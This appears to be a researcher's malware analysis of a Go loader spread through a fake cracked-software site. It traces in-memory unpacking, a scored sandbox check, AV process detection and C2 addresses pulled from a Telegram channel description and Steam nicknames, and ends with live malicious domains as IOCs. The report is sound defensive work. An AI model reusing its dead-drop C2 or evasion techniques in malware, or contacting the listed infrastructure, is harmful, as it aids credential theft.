![alt text](../screenshots/banner.png)
# Analysis — Go Loader with Dual C2 Redirection (Telegram + Steam)

**Date:** 2026-05-15

**Analyst:** dd1d3

**Source:** softload.org

**Classification:** Go loader, In-memory payload, Stealer (C2 via social platform parsing)

---

## Disclaimer

Analysis conducted in an isolated VM environment. All samples handled in sandboxed conditions. For educational purposes only.

---

## Overview

Found a site called `softload.org` that presents itself as a clean app distribution platform advertises cracked software like Adobe products, FL Studio, and so on. Downloaded one of the installers (`Setup.exe`). Turns out the binary is a Go-based loader that unpacks two modules directly into memory, never touching disk. The inner payload does sandbox checks, then reaches out to a Telegram channel and a Steam profile both used as redirectors to resolve the actual C2 address by parsing a specific string pattern from their public content

![alt text](softload.png)

---

## Infection Chain

```
[softload.org] — fake software distribution site
        |
        v
Setup.exe  (Go 1.25.4 loader, PE64, 2.51 MB)
        |
        └── unpacks two modules into memory
                |
                ├── hiddenmodule_5C0000000  (ASMx64 — main payload)
                |       |
                |       ├── sandbox check (score-based, need 6/9)
                |       ├── AV process detection
                |       ├── parses Telegram channel description → C2
                |       ├── parses Steam profile nickname → C2
                |
                └── hiddenmodule_C0000000  (broken/obfuscated, non-functional(probably))
```

---

## Stage 1 — Initial Triage: Setup.exe

DIE results:

- PE64, Go 1.25.4, AMD64, GUI
- Windows Authenticode signature (invalid)
- Overlay at offset `0x00281e00`, size `0x08a0`
- Sign tool: Windows Authenticode (2.0) [PKCS #7]

![alt text](diedetectitLOLZZa.png)

VirusTotal: **24/71**

![alt text](VRisutotalDF.png)

---

## Stage 2 — GoReSym: Symbol Recovery

Ran GoReSym to recover build info and function names

BuildInfo was intentionally wiped:

```json
"GoVersion": "go1.25.4",
"Path": "dmUNvDihAuxFcju",
"Main": {
    "Path": "dmUNvDihAuxFcju",
    "Version": "(devel)",
    "Sum": ""
}
```

Module path is a random string, version is dev build deliberately garbage

Function names show a clear obfuscation pattern:

```
main.uicreeu.func1
main.uicreeu.func3
main.uicreeu.func5
...
main.uicreeu.func19
```

Same package prefix across all exported closures/goroutines, numbered sequentially. Standard Go name obfuscation to prevent static analysis from yielding anything readable

![alt text](buildinfoGOlolz.png)

![alt text](secondGOlandInfo.png)
---

## Stage 3 — Dynamic Analysis: FakeNet

Launched Setup.exe with FakeNet running. Two outbound connections immediately:

**Request 1:**
```
POST /b9te3i HTTP/1.1
Host: telegram.me
Content-Type: multipart/form-data; boundary=----25b68b9ab56211b075e5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edg/147.0.0.0

hwid:     14781F05EB5ABD146726-681c50fe-2af5-E2ECF05
build_id: adadc61fcb978d97d9102581b7478bef
```

**Request 2:**
```
POST /profiles/76561198706525776 HTTP/1.1
Host: steamcommunity.com
Content-Type: multipart/form-data; boundary=----d0b39bdbcae86d283c66
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Safari/537.36 Edg/147.0.0.0

hwid:     14781F05EB5ABD146726-681c50fe-2af5-E2ECF05
build_id: adadc61fcb978d97d9102581b7478bef
```

Both endpoints receive the same multipart body with two fields: hardware ID and build ID. At this point it's not clear why it hits both that becomes obvious later

![alt text](fakenetsoftloadfirst.png)

![alt text](fakenetsteamcommunityparsersecond.png)

---

## Stage 4 — Process Dump: Extracting In-Memory Modules

Used process-dump to extract all modules loaded by Setup.exe. Got three executables:

```
Setup_exe_PID1734_hiddenmodule_5C0000000_x64.exe   1,088 KB
Setup_exe_PID1734_hiddenmodule_C0000000_x64.exe    1,104 KB
Setup_exe_PID1734_Setup.exe_7FF60B2B0000_x64.exe   2,884 KB
```

- Third file is Setup.exe itself the Go loader that unpacks the other two
- Second file (`C0000000`) bytes are broken after dump, nothing readable, obfuscated. Dead end
- First file (`5C0000000`) this is where everything happens

![alt text](dumpeverythingsoftload.png)

![alt text](eadaxzxcfsfd4ea.png)
---

## Stage 5 — hiddenmodule_5C0000000: Triage

DIE on the dumped module:

- PE64, ASMx64, Windows Vista+, GUI

So the inner payload is not Go. Go is used only as the outer loader/unpacker. The actual payload is compiled ASMx64

![alt text](zcxeferet234ada.png)

---

## Stage 6 — x64dbg: Strings and Behavior

Opened the dumped module in x64dbg and pulled strings

### Sandbox Check

The module implements a score-based sandbox detection system:

```
NtQueryInformationProcess
GetComputerNameA
GetDiskFreeSpaceExA
GetEnvironmentVariableA

USERNAME checks:    "John" / "sandbox"
COMPUTERNAME:       "JOHN-PC" / "SANDBOX"
WDAGUtilityAccount
```

Log output visible in strings:

```
sb: internet    skip (no ESET)
sb: debugger    OK
sb: peb_flags   OK
sb: cpus        %lu OK
sb: rdtsc       %lu OK
sb: modules     OK
sb: ram         %lu GB OK
sb: disk        %lu GB OK
sb: user        %s OK
sb: av_sandbox  OK
sb: pc          %s OK
sb: uptime      %lum %lus %s
sb: score       %d / 9 (need 6)
sb: passed
```

Nine checks, needs at least six to pass. Scoring approach instead of a hard stop makes it harder to bypass with a single environment tweak

### AV Detection

```
MsMpEng.exe        Windows Defender
MpCmdRun.exe
AvastSvc.exe
aswEngSrv.exe
AvastUI.exe
```

Scanning running processes for known AV executables

### C2 Strings

```
https://telegram.me/b9te3i
https://steamcommunity.com/profiles/76561198706525776
C2 unavailable, attempt %lu/%lu
```

WinHTTP imports present: `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpWriteData`, `WinHttpReceiveResponse`, `WinHttpReadData`, `WinHttpCloseHandle`.

`C2 unavailable` string confirms there's a retry loop with fallback logic

![alt text](adsaddsasq3e131FIRST.png)

![alt text](dad323245234DSECOBD.png)

![alt text](DAASZCX3223dadL.png)

![alt text](ADADZCXCeweklla3223.png)

![alt text](XAXSsa323.png)
---

## Stage 7 — Ghidra:

Static analysis in Ghidra confirmed the C2 resolution logic. The function that handles outbound requests contains the string `g3rm1n` alongside the Telegram URL. The decompiled code shows the payload sending requests to both platforms and parsing the response content

In the binary listing:

```
5c00b6ce0   ds   "https://telegram.me/b9te3i"
5c00b6cfb   ds   "profiles/76561198706525776"
```

The parser looks for `g3rm1n` in the retrieved content, then extracts everything between that string and the pipe character `|`. That substring is the actual C2 domain. Both Telegram and Steam serve as redundant sources for the same value if one is down, the other provides the address

![alt text](ADSCZXE44E3534CAads.png)

![alt text](adads3232dasc.png)

![alt text](adppadpad23103cz.png)


---

## Stage 8 — Telegram Channel:

Opened `t.me/b9te3i` in Tor Browser

Channel with 1 subscriber, description:

```
g3rm1n pgo.dusapp.com.br|
```

Parser extracts: `pgo.dusapp.com.br` → C2

WHOIS `dusapp.com.br`:

```
Owner:    Paulo Cesar Araujo Dutra
Created:  2023-05-10
Changed:  2026-05-11
NS:       Cloudflare
```

Already reported on abuse.ch as malicious infrastructure by researcher `crep1x`, tagged as a stealer C2 (2026-05-15 16:00 UTC)

![alt text](ffsfsdfsfsfdsfd1211.png)

![alt text](dadadda31101301301300azc.png)

![alt text](adaddzc33223117.png)
---

## Stage 9 — Steam Profile: 76561198706525776

Profile name at time of analysis:

```
g3rm1n pgo.fatherchrismas.com|
```

Clearly a throwaway account used only for C2 redirection

Same parsing pattern extract between `g3rm1n` and `|`, get `pgo.fatherchrismas.com`

The interesting part is the nickname history. Steam keeps previous display names:

```
g3rm1n pgo.fatherchrismas.com|
g3rm1n sit.fatherchrismas.com|
g3rm1n edg.fatherchrismas.com|
g3rm1n sup.fatherchrismas.com|
g3rm1n gnn.fatherchrismas.com|
g3rm1n fke.chriskendallvo.com|
g3rm1n mme.chriskendallvo.com|
g3rm1n sil.chriskendall.media|
g3rm1n pts.chriskendall.media|
g3rm1n bos.chriskendall.media|
```

Every name change C2 rotation. No recompilation needed just update the Steam nickname. Previous domains are likely burned or taken down. The whole infrastructure rotates around a single Steam account and a single Telegram channel

WHOIS `fatherchrismas.com`:

```
Registered:  2022-10-23
Updated:     2026-05-15
NS:          Cloudflare
Registrar:   eNom, LLC
State:       Tyne and Wear, GB
```

Updated the same day as this analysis. Also reported on abuse.ch by `crep1x` as stealer C2 (`pgo.fatherchrismas.com`)

![alt text](adzxccz4243166prof.png)

![alt text](addzxc23423542459329dld.png)

![alt text](adadzc32234242991sdaas.png)

![alt text](adcz3133333330010PDOO.png)

---

## How the C2 Redirection Works

```
payload starts
      |
      v
fetch t.me/b9te3i
fetch steamcommunity.com/profiles/76561198706525776
      |
      v
parse: find "g3rm1n", extract up to "|"
      |
      v
resolved C2: pgo.dusapp.com.br / pgo.fatherchrismas.com
      |
      v
POST /[path] with hwid + build_id
      |
      v
if unreachable → retry loop ("C2 unavailable, attempt %lu/%lu")
```

Two redirectors in parallel for redundancy. The payload never has a C2 domain hardcoded in a way that matters changing the domain only requires updating a public profile on a platform that doesn't require any special access

---

## IOCs

| Type | Value |
|------|-------|
| SHA256 | `7f2091310a34ae6c89a185d3d6fce8fd98324b65e180196513f8c53f01213be0` |
| Domain | `softload.org` |
| Domain | `pgo.dusapp.com.br` |
| Domain | `pgo.fatherchrismas.com` |
| Domain | `fke.chriskendallvo.com` |
| Domain | `mme.chriskendallvo.com` |
| Domain | `sil.chriskendall.media` |
| Domain | `pts.chriskendall.media` |
| Domain | `bos.chriskendall.media` |
| URL | `https://t.me/b9te3i` |
| URL | `https://steamcommunity.com/profiles/76561198706525776` |
| Field | `hwid: 14781F05EB5ABD146726-681c50fe-2af5-E2ECF05` |
| Field | `build_id: adadc61fcb978d97d9102581b7478bef` |

---


## Tools Used

| Tool | Purpose |
|------|---------|
| DIE (Detect It Easy) | Triage, compiler/packer detection |
| VirusTotal | Initial detection and family classification |
| GoReSym | Go symbol and BuildInfo recovery |
| FakeNet-NG | Network traffic interception |
| process-dump | In-memory module extraction |
| x64dbg | Dynamic analysis, string inspection |
| Ghidra | Static analysis, C2 parser decompilation |
| whois / abuse.ch | Infrastructure pivoting |
